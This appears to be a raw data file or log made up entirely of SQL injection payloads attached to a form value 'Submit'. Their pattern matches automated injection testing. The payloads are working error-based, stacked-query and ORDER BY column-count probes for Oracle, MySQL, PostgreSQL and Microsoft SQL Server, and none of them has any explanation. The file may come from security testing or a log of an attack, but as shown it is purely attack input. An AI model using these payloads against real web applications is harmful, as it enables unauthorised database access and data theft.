Submit AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- ukOc,1
Submit') AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('lAyZ'='lAyZ,1
Submit')) AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (('SgES'='SgES,1
Submit' AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'ydZI'='ydZI,1
Submit') AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('ZDpV' LIKE 'ZDpV,1
Submit%' AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'NOPi%'='NOPi,1
Submit' AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'gike' LIKE 'gike,1
"Submit"") AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (""BsSw""=""BsSw",1
"Submit"" AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ""WKqt""=""WKqt",1
Submit) AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (5155=5155,1
Submit)) AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ((2561=2561,1
Submit AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)),1
Submit AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113))-- bzHt,1
"Submit') PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('tiZM'='tiZM",1
"Submit')) PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (('LjXH'='LjXH",1
"Submit' PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'QTem'='QTem",1
"Submit') PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('xsfA' LIKE 'xsfA",1
"Submit%' PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'sVZz%'='sVZz",1
"Submit' PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'CROL' LIKE 'CROL",1
"Submit"") PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (""hrbL""=""hrbL",1
"Submit"" PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ""vOFF""=""vOFF",1
"Submit) PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (6229=6229",1
"Submit)) PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ((2319=2319",1
"Submit PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1)",1
"Submit PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1)-- xMLN",1
"(EXTRACTVALUE(2474,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(2474=2474,1))),0x717a627671)))",1
(CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC)),1
Submit');DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit'));DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit';DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit%';DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
"Submit"");DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--",1
"Submit"";DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--",1
Submit);DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit));DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit;DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit') ORDER BY 1-- Zueo,1
Submit') ORDER BY 2707-- XbXh,1
Submit')) ORDER BY 1-- nNiB,1
Submit')) ORDER BY 1154-- aXXG,1
Submit' ORDER BY 1-- eNdU,1
Submit' ORDER BY 3396-- owrz,1
Submit') ORDER BY 1-- lsmY,1
Submit') ORDER BY 2214-- HUZL,1
Submit%' ORDER BY 1-- uKKP,1
Submit%' ORDER BY 8281-- kPtb,1
Submit' ORDER BY 1-- RZZI,1
Submit' ORDER BY 1575-- HQRE,1
"Submit"") ORDER BY 1-- rznP",1
"Submit"") ORDER BY 1065-- nFFB",1
"Submit"" ORDER BY 1-- CVWy",1
"Submit"" ORDER BY 6603-- CPIE",1
Submit) ORDER BY 1-- LpLn,1
Submit) ORDER BY 7379-- WSXF,1
Submit)) ORDER BY 1-- tHCx,1
Submit)) ORDER BY 7246-- XQvz,1
Submit ORDER BY 1-- bTRB,1
Submit ORDER BY 3933-- Wvjn,1
Submit ORDER BY 1-- uSHi,1
Submit ORDER BY 6741-- YGyb,1
Submit') ORDER BY 1#,1
Submit') ORDER BY 5723#,1
Submit')) ORDER BY 1#,1
Submit')) ORDER BY 7221#,1
Submit' ORDER BY 1#,1
Submit' ORDER BY 3650#,1
Submit') ORDER BY 1#,1
Submit') ORDER BY 4825#,1
Submit%' ORDER BY 1#,1
Submit%' ORDER BY 2936#,1
Submit' ORDER BY 1#,1
Submit' ORDER BY 7098#,1
"Submit"") ORDER BY 1#",1
"Submit"") ORDER BY 8935#",1
"Submit"" ORDER BY 1#",1
"Submit"" ORDER BY 2344#",1
Submit) ORDER BY 1#,1
Submit) ORDER BY 7544#,1
Submit)) ORDER BY 1#,1
Submit)) ORDER BY 7263#,1
Submit ORDER BY 1#,1
Submit ORDER BY 4148#,1
Submit ORDER BY 1#,1
Submit ORDER BY 6596#,1
